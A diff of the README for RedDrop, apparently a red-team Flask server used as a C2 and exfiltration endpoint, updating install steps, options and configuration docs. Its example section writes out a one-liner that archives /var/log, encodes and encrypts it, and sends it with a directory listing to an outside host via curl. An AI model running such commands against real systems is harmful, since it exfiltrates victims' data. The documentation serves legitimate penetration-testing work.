@@ -10,7 +10,7 @@ RedDrop Exfil Server is a Python Flask Web Server for Penetration Testers, Red T
 - [Configurable Options](docs/Configurations.md)
 - [Authorization Rules](docs/AuthorizationRules.md)
 
-This software is intended to be used as an a rudementary C2 endpoint for capturing web request data in various scenarios. Some examples may include:
+This software is intended to be used as a rudimentary C2 endpoint for capturing web request data in various scenarios. Some examples may include:
 - A blind command injection vulnerability
 - An XSS attack where a quick and dynamic web request logging server is needed
 - A situation where remote shell access has been obtained and a verbose-logging web-based exfiltration server is desired
@@ -27,81 +27,115 @@ This software should not be left generally accessible to the broader Internet. I
 - Utilize the [Authorization Rules](docs/AuthorizationRules.md) feature of RedDrop to drop requests which do not meet your criteria. 
 - Place a Reverse Proxy to route and block traffic to this web application
 - Whitelist your target's IP space
-- Don't auto extract archives without understanding my filtering method
+- Don't auto extract archives without understanding our filtering method
 
 ## Quick Start
 ### Docker
+The image runs as an unprivileged user and therefore defaults to port `8080`. Build the image with your local UID/GID so bind-mounted upload and log directories remain writable:
+
 ```bash
-mkdir uploads logs
-docker run --rm -t -v "$PWD/uploads:/reddrop/uploads" -v "$PWD/logs:/reddrop/logs" -p "80:80" --name reddrop cyberbutler/reddrop -h
+docker build --build-arg UID="$(id -u)" --build-arg GID="$(id -g)" -t reddrop .
+mkdir -p uploads logs
+docker run --rm -it \
+  -v "$PWD/uploads:/reddrop/uploads" \
+  -v "$PWD/logs:/reddrop/logs" \
+  -p "8080:8080" \
+  --name reddrop reddrop
 ```
-### PipEnv
+
+Pass `-P <port>` after the image name to change the listening port inside the container. Use a port at or above `1024`; the container runs as an unprivileged user and cannot bind privileged ports.
+
+### uv
+Dependencies are managed with `uv` (`pyproject.toml` + `uv.lock`) and require Python 3.12+. The Docker image uses Python 3.13.
+
 ```bash
-pip install --user pipenv
-pipenv install
-pipenv shell
-python reddrop-server.py -h
+uv sync
+uv run python reddrop-server.py -P 8080
 ```
+
+The default port is `80`; use `-P` to bind an unprivileged port. Run `uv run python reddrop-server.py -h` for all options.
 
 ### Options
 ```bash
-python reddrop-server.py -h
+uv run python reddrop-server.py -h
 
      A Webserver for File and Data Exfiltration.
         Author: @cyberbutler/@thecyberbutler
 
-optional arguments:
+options:
   -h, --help            show this help message and exit
-  --host HOST, -H HOST  The host IP Address to bind to (default:
-                        0.0.0.0)
-  --port PORT, -P PORT  The port to bind to (default: 80)
-  -c CONFIG, --config CONFIG
-                        YAML config file path (default: None)
-  --dump-config         Dump the configuration settings as YAML
-                        (default: False)
+  -H, --host HOST       The host IP Address to bind to (default: 0.0.0.0)
+  -P, --port PORT       The port to bind to (default: 80)
+  -c, --config CONFIG   YAML config file path (default: None)
+  --dump-config         Dump the configuration settings as YAML (default:
+                        False)
   --debug               Enable Flask's Debug Mode (default: False)
-  -p {hex,openssl-aes256-pbkdf2,gzip,b64}, --processor {hex,openssl-aes256-pbkdf2,gzip,b64}
-                        Specify a processor to use. This flag can
-                        be used more than once to define multiple
-                        process_list functions. Use this flag in
-                        the order in which you wish to process
-                        received data (default: [])
+  -p, --processor {hex,openssl-aes256-pbkdf2,gzip,b64}
+                        Specify a processor to use. This flag can be used more
+                        than once to define multiple process_list functions.
+                        Use this flag in the order in which you wish to
+                        process received data (default: [])
   -A, --auto-process, --no-auto-process
-                        Automatically run processors based on
-                        detected data. This option is enabled by
-                        default, but should be disabled (--no-
-                        auto-process) when you receive output you
-                        don't expect. Such as in the case of
-                        Base64 decoding being run on output that
-                        is not Base64 encoded. Instead, force the
-                        process with the `-p` flag. (default:
-                        True)
-  --auto-extract-tar, -x
-                        Auto extract TAR archives received by the
-                        server. (default: False)
+                        Automatically run processors based on detected data.
+                        This option is enabled by default, but should be
+                        disabled (--no-auto-process) when you receive output
+                        you don't expect. Such as in the case of Base64
+                        decoding being run on output that is not Base64
+                        encoded. Instead, force the process with the `-p`
+                        flag. (default: True)
+  -x, --auto-extract-tar
+                        Auto extract TAR archives received by the server.
+                        (default: False)
   --encryption-password PROCESSOR_ARGUMENTS.OPENSSL-AES256-PBKDF2.PASSWORD
-                        The password used to decrypt/encrypt.
-                        (default: EncryptMe)
-  -r AUTHORIZATION_RULES, --authorization_rules AUTHORIZATION_RULES
-                        Specify an Authorization Rule to deny
-                        requests which do not match the provided
-                        Key and Regex value pair. Specified as
-                        <Key>=<Regex>. (default: None)
-  -t TAGS, --tag TAGS   Tag data received during this session in the logs as well as the directory files are uploaded to. Example:
+                        The password used to decrypt/encrypt. (default:
+                        EncryptMe)
+  -r, --authorization-rules, --authorization_rules AUTHORIZATION_RULES
+                        Specify an Authorization Rule to deny requests which
+                        do not match the provided Key and Regex value pair.
+                        Specified as <Key>=<Regex>. (default: None)
+  -t, --tag TAGS        Tag data received during this session in the logs as
+                        well as the directory files are uploaded to. Example:
                         -t log4j -t acme.org (default: None)
   --tls-keyfile GUNICORN.KEYFILE
-                        Enables TLS Support. (Production Only) The path to a TLS key file (default: None)
+                        Enables TLS Support. (Production Only) The path to a
+                        TLS key file (default: None)
   --tls-certfile GUNICORN.CERTFILE
-                        Enables TLS Support. (Production Only) The path to a TLS cert file (default: None)
+                        Enables TLS Support. (Production Only) The path to a
+                        TLS cert file (default: None)
 
-Far more configuration options exist which must be specified in Environment Variables, use `--dump-config` to see all of the options
+More configuration options are available through a YAML config file or Environment Variables. Use `--dump-config` to see all of the options.
 
 ```
 
+### Configuration
+RedDrop accepts configuration from a YAML file (`-c`), `REDDROP_*` environment variables, and explicit CLI flags. Precedence, highest first:
+
+1. Explicit CLI flags
+2. YAML config file
+3. `REDDROP_*` environment variables
+4. Built-in defaults
+
+Use `--dump-config` to print the resolved configuration:
+
+```bash
+uv run python reddrop-server.py -c config.yml --dump-config
+```
+
+See [Configurable Options](docs/Configurations.md) for every setting.
+
 ### Examples
+#### Sending a raw request body
+```bash
+curl --data-binary '68656c6c6f' \
+  -H 'Content-Type: application/octet-stream' \
+  http://localhost:8080/
+```
+
+Raw request bodies are processed like other parameters. The hex payload above is decoded to `hello`.
+
 #### Exfiltrating a Tar archive and command output from a Linux system
 ```bash
-tar cz /var/log | base64 | xxd -ps | gzip | openssl enc -aes-256-cbc -pass 'pass:EncryptMe' -e -a -pbkdf2 | curl 172.17.0.1$PWD -F 'logs=@-' -F "listing=`ls -al * | gzip | base64`"
+tar cz /var/log | base64 | xxd -ps | gzip | openssl enc -aes-256-cbc -pass 'pass:EncryptMe' -e -a -pbkdf2 | curl "http://172.17.0.1$PWD" -F 'logs=@-' -F "listing=`ls -al * | gzip | base64`"
 ```
 
 ![example-screenshot.png](docs/example-screenshot.png)
